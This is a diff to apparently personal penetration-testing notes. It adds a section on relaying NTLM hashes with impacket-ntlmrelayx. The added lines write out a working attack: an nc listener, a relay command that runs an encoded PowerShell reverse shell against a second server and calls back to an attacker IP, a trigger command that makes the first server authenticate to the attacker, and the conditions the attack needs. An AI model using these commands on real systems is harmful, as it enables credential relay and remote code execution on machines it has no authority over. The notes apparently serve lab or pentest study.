@@ -48,3 +48,15 @@ Format is `${LM_HASH}:${NT_HASH}` - when using the NTLM hash, just put `32 * 0` 
 
 a similar command is `impacket-wmiexec`, which gets us a shell as Administrator, rather than the SYSTEM.
 
+
+## Relay hash with impacket-ntlmrelayx
+
+You can relay SMB requests between SRV1 and SRV2 by doing the following:
+
+* Setup an nc listener on kali: `nc -nvlp 6666`.
+* From kali: `sudo impacket-ntlmrelayx --no-http-server -smb2support -t ${SRV2} -c "powershell -enc ${ENCODED_REV_SHELL}` (`ENCODED_REV_SHELL` points to `$ATTACKER_IP` and port `6666`)
+* From SRV1 do `dir \\$ATTACKER_IP\thiswillgetdenied`.
+The SMB request with the NTLMv2 Hash of the user on SRV1 will get relayed to SRV2.
+Target system needs to have UAC remote restrictions disabled, and the user on SRV1 needs to have access to SRV2 for this to work.
+
+
